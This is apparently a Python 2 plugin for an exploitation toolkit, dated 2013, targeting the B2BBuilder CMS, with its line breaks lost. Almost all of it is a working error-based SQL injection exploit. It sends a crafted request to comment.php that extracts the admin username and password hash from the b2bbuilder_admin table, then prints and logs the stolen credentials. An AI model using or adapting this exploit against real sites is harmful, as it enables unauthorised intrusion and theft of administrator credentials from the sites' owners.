# -*- coding: utf-8 -*-class mstplugin:    infos = [        ['Plugin','B2BBuilder_comment.php_SQLInject'],        ['Author','xfkxfk'],        ['Update','2013/10/25'],        ['Site','http://www.hackcto.com'],        ]    opts  = [        ['URL','localhost','Target URL'],        ['PATH','/','CMS Path'],        ['PORT','80','Target Port']        ]    def exploit(self):        url    = fuck.urlformate(URL,PORT,PATH)        get_pass    = '/comment.php?ctype=2&conid=16873%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x3A,user,0x3A,password,0x3A)%20from%20b2bbuilder_admin%20Order%20by%20user%20limit%200,1)%20)%20from%20`information_schema`.tables%20limit%200,1),floor(rand(0)*2))x%20from%20`information_schema`.tables%20group%20by%20x)a)%20and%201=1'        url    = url + get_pass        try:            color.cprint("[+] Sending exp ..",YELLOW)            res= fuck.urlget(url).read()            ok = fuck.find(r':\w+:\w+:',res)[0]            if len(ok)>0:                color.cprint("[*] Exploit Successful !",GREEN)                color.cprint("[*] %s"%ok,GREEN)                fuck.writelog("B2BBuilder_comment_php_sqli",URL+"::"+ok)            else:                color.cprint("[!] Exploit False !",RED)        except Exception,e:            color.cprint("[!] Exploit False ! CODE:%s"%e,RED)